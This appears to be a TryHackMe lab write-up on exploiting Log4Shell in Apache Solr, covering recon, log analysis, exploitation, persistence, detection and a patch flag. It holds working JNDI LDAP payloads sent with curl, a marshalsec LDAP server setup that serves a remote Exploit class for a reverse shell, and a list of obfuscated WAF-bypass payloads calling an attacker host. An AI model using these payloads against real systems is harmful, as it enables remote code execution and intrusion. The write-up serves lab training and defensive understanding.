# Log4Shell THM Writeups

## Reconnaissance

1) **What service is running on port 8983? (Just the name of the software)?**

Writeup:

Portscanning the instance with -p- and -sV which shows **Apache Solr** service runs on port 8893.

<img width="782" height="215" alt="image" src="https://github.com/user-attachments/assets/f03bfdb0-5fba-488b-9e46-ee5d1ba54c9a" />

Answer: **Apache Solr**


## Discovery 

1) **Take a close look at the first page visible when navigating to http://10.65.142.0:8983 (opens in new tab). You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?**

**Solution:**

<img width="627" height="317" alt="image" src="https://github.com/user-attachments/assets/76b135bf-1a77-49e7-afd2-4a61cbce3d8d" />


Analysing the given Logs we can see that `Dsolr.log.dir` is stored at `/var/solr/logs`

**Answer:**

`/var/solr/logs`

**2) One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry?**


**Answer:**

`solr.log` 

**3) What "path" or URL endpoint is indicated in these repeated entries?**

**Solution:**

<img width="1140" height="112" alt="image" src="https://github.com/user-attachments/assets/d90757ba-0e2d-4bb1-b659-81a085409de4" />

We can see that path `/admin/cores` is repeated multiple times in the log file.


**4) Viewing these log entries, what field name indicates some data entrypoint that you as a user could control?**

**Solution**

Analysing the data entrypoint can be params which is empty in the logs which can be used as a data entrypoint.

**Answer**

`params`

## Proof of Concept

Created a ncat listener on port 9999

<img width="525" height="176" alt="image" src="https://github.com/user-attachments/assets/b520fa08-92b7-4908-89d5-1dd7b255af66" />

Command: 

`nc -lnvp 9999`


Then connected usering curl in the `/solr/admin/cores?foo=` endpoint with my local ip with ldap lookup.





<img width="814" height="209" alt="image" src="https://github.com/user-attachments/assets/b0fa8239-ca6e-401b-85e8-769fa3523ad0" />

Command:

`curl 'http://10.49.145.26:8983/solr/admin/cores?foo=$\{jndi:ldap://10.49.122.225:9999\}'`

And I got the revshell


<img width="490" height="128" alt="image" src="https://github.com/user-attachments/assets/ed9a26e7-20b0-4b54-9d73-ab3097369db8" />



## Exploitation

In the netcat response we can see that the returned data is not readable its because, we didn't use a LDAP server to communicate to the target we need a LDAP server 

For that we can use marshalsec tool 

Github repo: https://github.com/mbechler/marshalsec

For building the marshalsec tool we need maven tool

Use this command to do it 

`sudo apt install maven`

`mvn clean package -DskipTests`


Also host a local python http server by using this command

`python3 -m http.server`

### Hosting the LDAP Server

Command: 

`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.49.122.225:8000/#Exploit"`

<img width="861" height="572" alt="image" src="https://github.com/user-attachments/assets/61ae4263-3d5b-4462-b317-ea641f7b363b" />

### Crafting our Exploit


<img width="889" height="235" alt="image" src="https://github.com/user-attachments/assets/ba3a1901-58e5-4f60-b7e3-7552e1a9fd31" />


Execute the java file using this command which generates the class file.

`javac Exploit.java -source 8 -target 8`

Then python3 server should we running in the same place of the Exploit is there

<img width="823" height="311" alt="image" src="https://github.com/user-attachments/assets/db69c335-1778-4ed5-9e9d-3284353de9fd" />


And open a ncat listenert in port 9999

<img width="542" height="161" alt="image" src="https://github.com/user-attachments/assets/c833a6a0-21eb-444e-8545-cf36c99a4524" />


### Final Exploitation

Command: 

`curl 'http://10.49.145.26:8983/solr/admin/cores?foo=$\{jndi:ldap://10.49.122.225:1389/Exploit\}'`

<img width="954" height="280" alt="image" src="https://github.com/user-attachments/assets/acc63de3-fd33-4959-b428-ec1daa435b84" />


And getting revshell

<img width="673" height="196" alt="image" src="https://github.com/user-attachments/assets/7883198c-0a68-43cb-8621-cb9eae923774" />


## Persistence

Spawning a shell

Command:

`python3 -c "import pty; pty.spawn('/bin/bash')"`

<img width="663" height="165" alt="image" src="https://github.com/user-attachments/assets/fb0bc3b2-d295-438a-b21b-364922e73000" />

Listing sudo permissions by 

`sudo -l`

<img width="961" height="204" alt="image" src="https://github.com/user-attachments/assets/cf36b68b-21c5-43e4-b747-7b59b832a929" />

We can see that anybody can change the superuser password so lets change it 

Changing the password of the machine

<img width="636" height="203" alt="image" src="https://github.com/user-attachments/assets/5a1e1919-561f-4236-abc1-a368a52b71bb" />


Connecting SSH with the changed password

Command:

`ssh solr@10.49.145.26`


<img width="974" height="753" alt="image" src="https://github.com/user-attachments/assets/916df066-d865-490c-b28e-b87028c24c2f" />

Successfully completed persistence

<img width="663" height="165" alt="image" src="https://github.com/user-attachments/assets/dc5c5335-7f8c-4a9a-a8a8-d02c91fbf9ef" />

## Detection

We know that the logs are stored in `/var/solr/logs`

We can see that our attack log has been stored

<img width="961" height="460" alt="image" src="https://github.com/user-attachments/assets/9b53d0dd-96ea-468f-9c69-4d00189d9915" />


## Bypasses

Bypass techniques to bypass the firewall/filters

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}
```

## Patching 

Adding this Line of code in the `/etc/default/solr.in.sh` file patches the vulnerability

`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`




